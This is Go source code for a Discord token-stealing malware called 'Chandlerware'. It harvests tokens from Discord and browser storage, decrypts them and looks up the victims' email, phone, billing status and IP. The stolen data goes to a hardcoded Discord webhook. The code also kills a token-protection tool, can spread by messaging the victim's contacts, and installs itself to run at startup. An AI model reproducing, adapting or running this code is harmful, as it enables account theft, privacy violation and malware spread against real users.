package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/mitchellh/go-ps"
	"golang.org/x/exp/slices"
)

var tokens []string

type UserData struct {
	Id                string
	Username          string
	Avatar            string
	Avatar_Decoration string
	Discriminator     string
	Public_Flags      int
}

type User struct {
	Id       string
	Nickname string
	User     UserData
}

type DDamon struct {
	FirstBoot bool `json:"firstboot"`
}

type Message struct {
	Content string `json:"content"`
	Tts     bool   `json:"tts"`
}

// https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS
const (
	WEBHOOK_URL = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
	SPREAD_MSG  = "spreadmsg"
	SPREAD      = false
	BLOCK       = false
	KILL        = false
	STARTUP     = true
)

func main() {
	antiTokenProtect()
	start()
	spred()
	killProcess()
	blockDiscord()
	antiTokenProtect()
	runOnStartup()
	// block_dc()

}

func runOnStartup() {
	if !STARTUP {
		return
	}

	// check if we have run before
	if _, err := os.Stat("DDamon_Dll.dll"); err == nil {
		data, _ := os.ReadFile("DDamon_Dll.dll")
		var ddamon DDamon
		json.Unmarshal([]byte(data), &ddamon)
		if !ddamon.FirstBoot {
			return
		}
	}
	// check if "DDamon_Dll.dll" exists in the current directory
	// if it doesn't then create it

	if _, err := os.Stat("DDamon_Dll.dll"); errors.Is(err, os.ErrNotExist) {
		f, _ := os.Create("DDamon_Dll.dll")
		defer f.Close()

		data := base64.StdEncoding.EncodeToString([]byte(`{"firstboot": false}`))
		_, err2 := f.WriteString(data)
		if err2 != nil {
			panic(err2)
		}

	}

	// get the current user
	usr, err := user.Current()
	if err != nil {
		panic(err)
	}
	appdata := usr.HomeDir + "\\AppData\\Roaming"
	// check if "DDamon" directory exists in the current user's appdata
	// if it doesn't then create it

	if _, err := os.Stat(appdata + "\\DDamon"); errors.Is(err, os.ErrNotExist) {
		os.Mkdir(appdata+"\\DDamon", 0777)
	}

	// copy the current executable to "DDamon" directory
	// get the current executable's path
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	// copy the current executable to "DDamon" directory
	err = os.Link(ex, appdata+"\\DDamon\\DDamon.exe")
	if err != nil {
		panic(err)
	}
	// copy DDamon_Dll.dll to "DDamon" directory
	err = os.Link("DDamon_Dll.dll", appdata+"\\DDamon\\DDamon_Dll.dll")
	if err != nil {
		panic(err)
	}

	// create a shortcut to the current executable in the startup folder
	// get the current user's startup folder
	startup := usr.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

	// create a "startDDamon.bat" file in the startup folder
	f, _ := os.Create(startup + "\\startDDamon.bat")
	// write the following to the file
	// start "" "C:\Users\%username%\AppData\Roaming\DDamon\DDamon.exe"
	_, err2 := f.WriteString("start \"" + appdata + "\\DDamon\" \"" + appdata + "\\DDamon\\DDamon.exe\"")
	if err2 != nil {
		panic(err2)
	}

}

func antiTokenProtect() {
	// get all running processes
	processes, err := ps.Processes()
	if err != nil {
		panic(err)
	}
	for _, process := range processes {
		if process.Executable() == "DiscordTokenProtect.exe" {
			killProcessByName("DiscordTokenProtect")

		}
	}

}

func blockDiscord() {
	if !BLOCK {
		return
	}

}

func spred() {
	if !SPREAD {
		return
	}

	if _, err := os.Stat("DDamon_Dll.dll"); err == nil {
		data, _ := os.ReadFile("DDamon_Dll.dll")
		data, _ = base64.StdEncoding.DecodeString(string(data))
		var ddamon DDamon
		json.Unmarshal(data, &ddamon)
		if !ddamon.FirstBoot {
			return
		}
	}

	for _, token := range tokens {
		fmt.Println(token)
		//  var friends []string
		body, err := getRequest("https://discord.com/api/v9/users/@me/channels", true, token)
		if err != nil {
			fmt.Println(err)
			continue
		}
		fmt.Println(body)

		var Friends []User
		err1 := json.Unmarshal([]byte(body), &Friends)

		if err1 != nil {
			fmt.Println(err1)
		}

		var requests []*http.Request
		for _, friend := range Friends {
			//fmt.Printf("%s: %v\n", string(rune(i)), user)
			data := new(Message)
			data.Content = SPREAD_MSG
			data.Tts = false
			d, _ := json.Marshal(data)
			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+friend.Id+"/messages", bytes.NewBuffer(d))
			fmt.Println("https://discord.com/api/v9/channels/" + friend.Id + "/messages")
			if wth != nil {
				fmt.Println(wth)
			}
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", token)
			requests = append(requests, req)
		}

		fmt.Println(len(requests))

		for _, req := range requests {
			cl := &http.Client{}
			res, _ := cl.Do(req)
			fmt.Println(string(res.StatusCode) + " " + res.Status)
			time.Sleep(750 * time.Millisecond)
		}
		// req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+ ChannelId + "/messages")
	}
}

func killProcess() {
	if !KILL {
		return
	}
	processlist := []string{"discord", "discordcanary", "discordptb", "lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic"}
	for _, process := range processlist {
		killProcessByName(process)
	}

}

func killProcessByName(process string) {
	var cmd *exec.Cmd
	cmd = exec.Command("taskkill", "/F", "/IM", process+".exe")
	cmd.Run()
}

func send_info(token string) {
	_, embed := grabTokenInformation(token)
	data := []byte(embed)
	req, _ := http.NewRequest("POST", WEBHOOK_URL, bytes.NewBuffer(data))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	cl := &http.Client{}
	response, err := cl.Do(req)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(response.StatusCode) + " " + response.Status)

	defer response.Body.Close()
}

func grabTokenInformation(token string) (data string, jsonEmbed string) {

	// Get User displayName
	var displayName string
	currentUser, err := user.Current()
	if err != nil {
		displayName = "Unknown"
	} else {
		displayName = currentUser.Name
	}

	// Get OS Type & Proc arch
	osName := runtime.GOOS
	cpuArch := runtime.GOARCH

	// Get computer IP
	var ip string
	body, err := getRequest("https://ipinfo.io/ip", false, "")
	if err != nil {
		ip = "Unknown"
	} else {
		ip = body
	}

	var tokenInformation string
	body, err = getRequest("https://discord.com/api/v9/users/@me", true, token)
	if err != nil {
		tokenInformation = "Unknown"
	} else {
		tokenInformation = body
	}

	discordUser := getJsonValue("username", tokenInformation) + "#" + getJsonValue("discriminator", tokenInformation)
	discordEmail := getJsonValue("email", tokenInformation)
	discordPhone := getJsonValue("phone", tokenInformation)
	discordAvatar := "https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200" + getJsonValue("id", tokenInformation) + "/" + getJsonValue("avatar", tokenInformation) + ".png"

	var discordNitro string
	body, err = getRequest("https://discord.com/api/v9/users/@me/billing/subscriptions", true, token)
	if err != nil {
		discordNitro = "Unknown"
	} else {

		if body == "[]" {
			discordNitro = "No"
		} else {
			discordNitro = "Yes"
		}
	}

	//data = `[{"Username": "` + discordUser + `", "Email": "` + discordEmail + `", "Phone": "` + discordPhone + `", "Nitro": "` + discordNitro + `", "Ip": "` + ip + `", "DisplayName": "` + currentUser.Name + `", "PCUsername": "` + strings.Split(currentUser.Username, "\\")[1] + `", "OS": "` + osName + `", "CPUArch": "` + cpuArch + `"}]`
	//fmt.Print(data)
	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + strings.Split(currentUser.Username, "\\")[1] + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
	return
}

func start() {
	if _, err := os.Stat("DDamon_Dll.dll"); err == nil {
		data, _ := os.ReadFile("DDamon_Dll.dll")
		data, _ = base64.StdEncoding.DecodeString(string(data))
		var ddamon DDamon
		json.Unmarshal([]byte(data), &ddamon)
		if !ddamon.FirstBoot {
			return
		}
	}
	appdata, _ := os.UserConfigDir()
	localappdata, _ := os.UserCacheDir()
	locations := []string{}

	// Token locations
	locations = append(locations, appdata+"\\discord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordcanary\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordptb\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Lightcord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Mozilla\\Firefox\\Profiles")
	locations = append(locations, localappdata+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Yandex\\YandexBrowser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\")

	for _, location := range locations {
		if _, err := os.Stat(location); os.IsNotExist(err) {
			continue
		}
		if strings.Contains(location, "Mozilla") {
			for _, filepath := range get_files(location, ".sqlite") {
				r := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
					tokens = append(tokens, match...)

				}
			}
		}
		if strings.Contains(location, "cord") {
			for _, filepath := range get_files(location, ".ldb") {
				r := regexp.MustCompile("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllString(string(data), -1) {
					baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
					tokenEnc, _ := base64.StdEncoding.DecodeString(baseToken)
					token, _ := decryptToken(tokenEnc)
					_, val := get_token_info(token)
					if !val {
						continue
					}

					if !slices.Contains(tokens, string(token)) {
						tokens = append(tokens, string(token))
						send_info(token)

					}
				}
			}
		}

	}
	// var oldU string
	// for _, t := range tokens {
	// 	data, _ := grabTokenInformation(t)
	// 	u := data.Username
	// 	if !(u == oldU) {
	// 	}
	// 	oldU = u
	// }
}

func get_files(root, ext string) []string {
	var a []string
	filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
		if e != nil {
			return e
		}
		if filepath.Ext(d.Name()) == ext {
			a = append(a, s)
		}
		return nil
	})
	return a
}

func getJsonValue(key string, jsonData string) (value string) {

	var result map[string]interface{}

	err := json.Unmarshal([]byte(jsonData), &result)
	if err != nil {
		return "Unknown"
	}

	value = fmt.Sprintf("%v", result[key])
	return
}
